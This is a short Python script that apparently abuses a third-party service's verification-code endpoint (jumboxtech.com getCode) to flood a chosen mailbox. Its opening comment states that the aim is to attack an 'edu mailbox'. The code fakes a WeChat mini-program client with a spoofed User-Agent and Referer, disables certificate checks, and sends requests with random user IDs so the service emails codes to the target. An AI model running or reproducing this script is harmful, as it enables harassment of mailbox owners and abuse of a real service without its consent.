'''
F88K that edu mailbox.

Send the email with RANDOM userId, you can choose anyone that has
'''

import json
import string
import random
import requests

email = 'ANYEMAIL@ANY.ANY'

requests.packages.urllib3.disable_warnings()
base_url = "https://www.jumboxtech.com:8022/user/getCode"
header = {
    'Host': 'www.jumboxtech.com:8022',
    'Connection': 'keep-alive',
    # 'Content-Length': '39',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; GM1900 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Safari/537.36 MMWEBID/9558 MicroMessenger/8.0.2.1860(0x28000234) Process/appbrand0 WeChat/arm32 Weixin Android Tablet NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
    'charset': 'utf-8',
    'Accept-Encoding': 'gzip,compress,br,deflate',
    'content-type': 'application/x-www-form-urlencoded',
    'Referer': 'https://servicewechat.com/wxf7f31446cd68367a/5/page-frame.html',
}

def random_string_generator(str_size, allowed_chars):
    return ''.join(random.choice(allowed_chars) for x in range(str_size))

chars = string.ascii_uppercase + string.digits * 3
size = 32

random_user_id = random_string_generator(size, allowed_chars=chars)

s = requests.session()
s.keep_alive = False
payload = f'userId={random_user_id}&email={email}'
req = s.post(base_url, headers=header, data=payload, verify=False)
print(req.content.decode(encoding='utf-8'))
ob = json.loads(req.content.decode(encoding='utf-8'))